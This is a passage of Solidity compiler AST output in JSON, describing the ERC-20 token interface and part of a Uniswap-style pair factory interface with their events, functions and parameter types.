												"constant": false,
												"id": 443,
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"scope": 448,
												"src": "165:15:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 442,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "165:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 445,
												"name": "data",
												"nodeType": "VariableDeclaration",
												"scope": 448,
												"src": "190:19:1",
												"stateVariable": false,
												"storageLocation": "calldata",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes_calldata_ptr",
													"typeString": "bytes"
												},
												"typeName": {
													"id": 444,
													"name": "bytes",
													"nodeType": "ElementaryTypeName",
													"src": "190:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_storage_ptr",
														"typeString": "bytes"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "106:109:1"
									},
									"returnParameters": {
										"id": 447,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "224:0:1"
									},
									"scope": 449,
									"src": "86:139:1",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								}
							],
							"scope": 450,
							"src": "62:165:1"
						}
					],
					"src": "36:192:1"
				},
				"id": 1
			},
			"IERC20.sol": {
				"ast": {
					"absolutePath": "IERC20.sol",
					"exportedSymbols": {
						"IERC20": [
							533
						]
					},
					"id": 534,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 451,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "36:24:2"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": null,
							"fullyImplemented": false,
							"id": 533,
							"linearizedBaseContracts": [
								533
							],
							"name": "IERC20",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"anonymous": false,
									"documentation": null,
									"id": 459,
									"name": "Approval",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 458,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 453,
												"indexed": true,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 459,
												"src": "109:21:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 452,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "109:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 455,
												"indexed": true,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 459,
												"src": "140:23:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 454,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "140:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 457,
												"indexed": false,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 459,
												"src": "173:13:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 456,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "173:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "99:93:2"
									},
									"src": "85:108:2"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 467,
									"name": "Transfer",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 466,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 461,
												"indexed": true,
												"name": "from",
												"nodeType": "VariableDeclaration",
												"scope": 467,
												"src": "213:20:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 460,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "213:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 463,
												"indexed": true,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 467,
												"src": "235:18:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 462,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "235:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 465,
												"indexed": false,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 467,
												"src": "255:13:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 464,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "255:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "212:57:2"
									},
									"src": "198:72:2"
								},
								{
									"body": null,
									"documentation": null,
									"id": 472,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "name",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 468,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "289:2:2"
									},
									"returnParameters": {
										"id": 471,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 470,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 472,
												"src": "316:13:2",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 469,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "316:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "315:15:2"
									},
									"scope": 533,
									"src": "276:55:2",
									"stateMutability": "pure",
									"superFunction": 624,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 477,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "symbol",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 473,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "352:2:2"
									},
									"returnParameters": {
										"id": 476,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 475,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 477,
												"src": "378:13:2",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 474,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "378:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "377:15:2"
									},
									"scope": 533,
									"src": "337:56:2",
									"stateMutability": "pure",
									"superFunction": 629,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 482,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "decimals",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 478,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "416:2:2"
									},
									"returnParameters": {
										"id": 481,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 480,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 482,
												"src": "442:5:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 479,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "442:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "441:7:2"
									},
									"scope": 533,
									"src": "399:50:2",
									"stateMutability": "pure",
									"superFunction": 634,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 487,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "totalSupply",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 483,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "475:2:2"
									},
									"returnParameters": {
										"id": 486,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 485,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 487,
												"src": "501:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 484,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "501:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "500:9:2"
									},
									"scope": 533,
									"src": "455:55:2",
									"stateMutability": "view",
									"superFunction": 639,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 494,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "balanceOf",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 490,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 489,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 494,
												"src": "535:13:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 488,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "535:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "534:15:2"
									},
									"returnParameters": {
										"id": 493,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 492,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 494,
												"src": "573:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 491,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "573:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "572:9:2"
									},
									"scope": 533,
									"src": "516:66:2",
									"stateMutability": "view",
									"superFunction": 646,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 503,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "allowance",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 499,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 496,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 503,
												"src": "616:13:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 495,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "616:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 498,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 503,
												"src": "639:15:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 497,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "639:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "606:54:2"
									},
									"returnParameters": {
										"id": 502,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 501,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 503,
												"src": "684:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 500,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "684:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "683:9:2"
									},
									"scope": 533,
									"src": "588:105:2",
									"stateMutability": "view",
									"superFunction": 655,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 512,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "approve",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 508,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 505,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 512,
												"src": "716:15:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 504,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "716:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 507,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 512,
												"src": "733:13:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 506,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "733:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "715:32:2"
									},
									"returnParameters": {
										"id": 511,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 510,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 512,
												"src": "766:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 509,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "766:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "765:6:2"
									},
									"scope": 533,
									"src": "699:73:2",
									"stateMutability": "nonpayable",
									"superFunction": 664,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 521,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "transfer",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 517,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 514,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 521,
												"src": "796:10:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 513,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "796:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 516,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 521,
												"src": "808:13:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 515,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "808:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "795:27:2"
									},
									"returnParameters": {
										"id": 520,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 519,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 521,
												"src": "841:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 518,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "841:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "840:6:2"
									},
									"scope": 533,
									"src": "778:69:2",
									"stateMutability": "nonpayable",
									"superFunction": 673,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 532,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "transferFrom",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 528,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 523,
												"name": "from",
												"nodeType": "VariableDeclaration",
												"scope": 532,
												"src": "884:12:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 522,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "884:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 525,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 532,
												"src": "906:10:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 524,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "906:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 527,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 532,
												"src": "926:13:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 526,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "926:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "874:71:2"
									},
									"returnParameters": {
										"id": 531,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 530,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 532,
												"src": "964:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 529,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "964:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "963:6:2"
									},
									"scope": 533,
									"src": "853:117:2",
									"stateMutability": "nonpayable",
									"superFunction": 684,
									"visibility": "external"
								}
							],
							"scope": 534,
							"src": "62:910:2"
						}
					],
					"src": "36:937:2"
				},
				"id": 2
			},
			"IFactory.sol": {
				"ast": {
					"absolutePath": "IFactory.sol",
					"exportedSymbols": {
						"IFactory": [
							601
						]
					},
					"id": 602,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 535,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "36:24:3"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": null,
							"fullyImplemented": false,
							"id": 601,
							"linearizedBaseContracts": [
								601
							],
							"name": "IFactory",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"anonymous": false,
									"documentation": null,
									"id": 545,
									"name": "PairCreated",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 544,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 537,
												"indexed": true,
												"name": "token0",
												"nodeType": "VariableDeclaration",
												"scope": 545,
												"src": "114:22:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 536,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "114:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 539,
												"indexed": true,
												"name": "token1",
												"nodeType": "VariableDeclaration",
												"scope": 545,
												"src": "146:22:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 538,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "146:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 541,
												"indexed": false,
												"name": "pair",
												"nodeType": "VariableDeclaration",
												"scope": 545,
												"src": "178:12:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 540,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "178:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 543,
												"indexed": false,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 545,
												"src": "200:7:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 542,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "200:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "104:109:3"
									},
									"src": "87:127:3"
								},
								{
									"body": null,
									"documentation": null,
									"id": 550,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "feeTo",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 546,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "234:2:3"
									},
									"returnParameters": {
										"id": 549,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 548,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 550,
												"src": "260:7:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 547,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "260:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "259:9:3"
									},
									"scope": 601,
									"src": "220:49:3",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 555,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "feeToSetter",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 551,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "295:2:3"
									},
									"returnParameters": {
										"id": 554,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 553,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 555,
												"src": "321:7:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 552,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "321:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "320:9:3"
									},
									"scope": 601,
									"src": "275:55:3",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 564,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "getPair",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 560,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 557,
												"name": "tokenA",
												"nodeType": "VariableDeclaration",
												"scope": 564,
												"src": "362:14:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 556,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "362:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 559,
												"name": "tokenB",
												"nodeType": "VariableDeclaration",
												"scope": 564,
												"src": "386:14:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 558,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "386:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "352:54:3"
									},
									"returnParameters": {
										"id": 563,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 562,
												"name": "pair",
												"nodeType": "VariableDeclaration",
												"scope": 564,
												"src": "430:12:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 561,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "430:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "429:14:3"
									},
									"scope": 601,
									"src": "336:108:3",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 571,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "allPairs",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 567,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 566,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 571,
												"src": "468:7:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 565,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "468:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "467:9:3"
									},
									"returnParameters": {
										"id": 570,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 569,
												"name": "pair",
												"nodeType": "VariableDeclaration",
												"scope": 571,
												"src": "500:12:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 568,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "500:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "499:14:3"
									},
									"scope": 601,
									"src": "450:64:3",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 576,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "allPairsLength",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 572,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "543:2:3"
									},
									"returnParameters": {
										"id": 575,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 574,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 576,
												"src": "569:7:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
